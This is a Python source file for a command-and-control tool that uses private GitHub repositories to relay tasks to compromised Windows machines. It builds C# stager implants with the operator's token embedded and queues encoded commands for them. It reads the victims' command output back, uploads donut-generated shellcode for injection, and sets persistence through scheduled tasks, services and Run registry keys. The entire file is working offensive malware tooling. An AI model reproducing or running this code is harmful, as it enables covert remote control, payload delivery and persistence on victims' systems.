from colorama import init, Fore, Back, Style
from pysxm import ComplexType
from datetime import datetime
import base64
import donut
import json
import os
import requests
import subprocess
import sys
import xml.etree.ElementTree as ET

init(convert=True)

try:
    tree = ET.parse('config.xml')
    root = tree.getroot()
    username = root[0].text
    token = root[1].text
    if len(root) == 5:
        if root[3] == 'True':
            os.environ['HTTPS_PROXY'] = 'http://' + root[3].text + ':' + root[4].text
except FileNotFoundError as e:
    print('Configuration file not found, run config.py')
    sys.exit(0)

class Project(ComplexType):
    def __init__(self):
        self.name = ''
        self.date = ''
        self.stager = ''
        self.persistant = 'Not persistant'
        self.rate = ''
        self.date = ''
        
def new():
    try:
        New_project = Project()
        New_project.name = input('project name: ')
        url = "https://api.github.com/user/repos"
        headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36' , 'Host': 'api.github.com' , 'Authorization': 'Basic ' + token , 'Accept': 'application/json' }
        body = {"name": New_project.name ,"description": New_project.name , "homepage":"https://github.com", "private": "true"}
        response = requests.post(url, headers = headers, json = body)
        if response.status_code != 201:
            print(Fore.BLUE + 'Failed to create project')
            sys.exit(0)
        New_project.date = datetime.today().strftime('%d/%m/%Y')
        New_project.persistant = "Not persistant"
        url = "https://api.github.com/repos/" + username + "/" + New_project.name + "/contents/commands.txt"
        headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36' , 'Host': 'api.github.com' , 'Authorization': 'Basic ' + token , 'Accept': 'application/json' }
        body = {"message":"a new commit message","committer":{"name":"C2","email":"C2@c2.com"},"content":"aW5qZWN0"}    
        response = requests.put(url, headers = headers, json = body)
        stager = input('Select stager ( Native, Native Persistant, Syscall, Syscall Persistant ): ')
        if stager == 'Native':
            New_project.stager = stager
            with open('./Stagers/Native/Program.cs', 'r') as file:
                data = file.readlines()
            data[114] = '\t\t\tSslTcpClient.RunClient("api.github.com", "' + New_project.name + '", "' + username + '", "' + token + '");\n'
            with open('./Stagers/Native/Program.cs', 'w') as file:
                file.writelines(data)
            process = subprocess.Popen('MSBuild.exe ./Stagers/Native/Stager.sln /p:Configuration=Release /p:Platform="x64" /p:OutDir=' + os.getcwd() + '\\Projects\\' + New_project.name + '\\')
            process.wait()
        if stager == 'Syscall':
            New_project.stager = stager
            with open('./Stagers/Syscall/directinjectorPOC/Program.cs', 'r') as file:
                data = file.readlines()
            data[14] = '\t\t\tSslTcpClient.RunClient("api.github.com", "' + New_project.name + '", "' + username + '", "' + token + '");\n'
            with open('./Stagers/Syscall/directinjectorPOC/Program.cs', 'w') as file:
                file.writelines(data)
            process = subprocess.Popen('MSBuild.exe ./Stagers/Syscall/directinjectorPOC.sln /p:Configuration=Release /p:Platform="x64" /p:OutDir=' + os.getcwd() + '\\Projects\\' + New_project.name + '\\')
            process.wait()
            print('Project created successfuly, set shellcode payload before running stager')
        if stager == 'Native Persistant':
            New_project.stager = stager
            with open('./Stagers/NativePersistant/Program.cs', 'r') as file:
                data = file.readlines()
            data[160] = '\t\t\tSslTcpClient.RunClient("api.github.com", "' + New_project.name + '", "' + username + '", "' + token + '");\n'
            with open('./Stagers/NativePersistant/Program.cs', 'w') as file:
                file.writelines(data)
            process = subprocess.Popen('MSBuild.exe ./Stagers/NativePersistant/Stager.sln /p:Configuration=Release /p:Platform="x64" /p:OutDir=' + os.getcwd() + '\\Projects\\' + New_project.name + '\\')
            process.wait()
            New_project.persistant = persistence(New_project.name)
            print('Project created successfuly')
        if stager == 'Syscall Persistant':
            New_project.stager = stager
            with open('./Stagers/SyscallPersistant/directinjectorPOC/Program.cs', 'r') as file:
                data = file.readlines()
            data[14] = '\t\t\tSslTcpClient.RunClient("api.github.com", "' + New_project.name + '", "' + username + '", "' + token + '");\n'
            with open('./Stagers/SyscallPersistant/directinjectorPOC/Program.cs', 'w') as file:
                file.writelines(data)
            process = subprocess.Popen('MSBuild.exe ./Stagers/SyscallPersistant/directinjectorPOC.sln /p:Configuration=Release /p:Platform="x64" /p:OutDir=' + os.getcwd() + '\\Projects\\' + New_project.name + '\\')
            process.wait()
            New_project.persistant = persistence(New_project.name)
            print('Project created successfuly')
        New_project.save('Projects/' + New_project.name + '/data.xml')
        return New_project.name
    except Exception as error:
      print(Fore.RED + 'Error creating project: {}\r\n'.format(error))
      sys.exit(0)

def show():
    try:
        url = "https://api.github.com/user/repos"
        headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36' , 'Host': 'api.github.com' , 'Authorization': 'Basic ' + token , 'Accept': 'application/json' }
        response = requests.get(url, headers = headers)
        loaded_json = json.loads(response.text)
        print('Projects:\r\n')
        for i in range(len(loaded_json)):
            print('> ' + loaded_json[i]['name'])
    except Exception as error:
        print(Fore.RED + 'Error retreiving projects: {}\r\n'.format(error))

def load(project):
    try:
        url = "https://api.github.com/repos/" + username + "/" + project + "/contents/commands.txt"
        headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36' , 'Host': 'api.github.com' , 'Authorization': 'Basic ' + token , 'Accept': 'application/json' }
        response = requests.get(url, headers = headers)
        if response.status_code == 404:
            return False
        return True
    except Exception as error:
        print(Fore.RED + 'Error loading project: {}\r\n'.format(error))

def get_command_history(project):
    try:
        url = "https://api.github.com/repos/" + username + "/" + project + "/contents/output/"
        headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36' , 'Host': 'api.github.com' , 'Authorization': 'Basic ' + token , 'Accept': 'application/json' }
        response = requests.get(url, headers = headers)
        loaded_json = json.loads(response.text)
        print('Command history:\r\n')
        for i in range(len(loaded_json)):
            if loaded_json[i]['name'] != 'README.md':
                loaded_json[i]['name'] = loaded_json[i]['name'].replace('(slash)', '/')
                print('> ' + loaded_json[i]['name'])
        print('Access the output of each command by typing: get output <command>\r\n')   
    except Exception as error:
        print(Fore.RED + 'Error retrieving command history: {}\r\n'.format(error))

def set_command(command, project):
    try:
        url = "https://api.github.com/repos/" + username + "/" + project + "/contents/commands.txt"
        headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36' , 'Host': 'api.github.com' , 'Authorization': 'Basic ' + token , 'Accept': 'application/json' }
        response = requests.get(url, headers = headers)
        loaded_json = json.loads(response.text)
        content = loaded_json['sha']
        command_base64 = base64.b64encode(command).decode('ascii')
        body = {"message":"a new commit message","committer":{"name":"C2","email":"C2@c2.com"},"content":command_base64,"sha":content}
        response = requests.put(url, headers = headers, json = body)
        print('The command was edited successfully\r\n')
    except Exception as error:
        print(Fore.RED + 'Error editing command: {}\r\n'.format(error))

def get_command_output(command, project):
    try:
        command = command.replace('/', '(slash)')
        url = "https://api.github.com/repos/" + username + "/" + project + "/contents/output/" + command
        headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36' , 'Host': 'api.github.com' , 'Authorization': 'Basic ' + token , 'Accept': 'application/json' }
        response = requests.get(url, headers = headers)
        loaded_json = json.loads(response.text)
        content = loaded_json['content']
        output = base64.b64decode(content).decode("utf-8") 
        print('Command output: ')
        print(output)
    except KeyError:
        print(Fore.RED + 'Command not found\r\n')

def get_command(project):
    try:
        url = "https://api.github.com/repos/" + username + "/" + project + "/contents/commands.txt"
        headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36' , 'Host': 'api.github.com' , 'Authorization': 'Basic ' + token , 'Accept': 'application/json' }
        response = requests.get(url, headers = headers)
        loaded_json = json.loads(response.text)
        content = loaded_json['content']
        output = base64.b64decode(content).decode("utf-8") 
        print('Next command on queue: ')
        print(output + '\r\n')
    except Exception as error:
        print(Fore.RED + 'Error retrieving command: {}\r\n'.format(error))

def set_shellcode(filename, project):
    try:
        shellcode = donut.create(file = filename)
        encodedBytes = base64.b64encode(shellcode)
        encodedStr = str(encodedBytes, "utf-8")
        url = "https://api.github.com/repos/" + username + "/" + project + "/contents/shellcode.bin"
        headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36' , 'Host': 'api.github.com' , 'Authorization': 'Basic ' + token , 'Accept': 'application/json' }
        body = {"message":"a new commit message","committer":{"name":"C2","email":"C2@c2.com"},"content":encodedStr}    
        response = requests.put(url, headers = headers, json = body)
        if response.status_code != 201:
            print(Fore.RED + 'Failed to upload shellcode')
    except Exception as error:
        print(Fore.RED + 'Error generating shellcode: {}\r\n'.format(error)) 
            
def persistence(project):
    method = input('Choose one of the following methods: ( Scheduled Task, Service, Registry Keys ): ')
    if method == 'Scheduled Task':
        command = 'SCHTASKS /CREATE /SC HOURLY /TN "MyTasks\\stager" /TR "stager.exe" /ST 12:00'
        set_command(command.encode('ascii'), project)
        return 'Scheduled Task'
    if method == 'Service':
        command = 'sc create stager binpath= "Stager.exe" start= "auto" obj= "LocalSystem" password= "" && sc start stager'
        set_command(command.encode('ascii'), project)
        return 'Service'
    if method == 'Registry Keys':
        command = 'reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v stager /t REG_SZ /d "stager.exe" && reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v stager /t REG_SZ /d "stager.exe" && reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices" /v stager /t REG_SZ /d "stager.exe" && reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce" /v stager /t REG_SZ /d "stager.exe"'
        set_command(command.encode('ascii'), project)
        return 'Registry Keys'
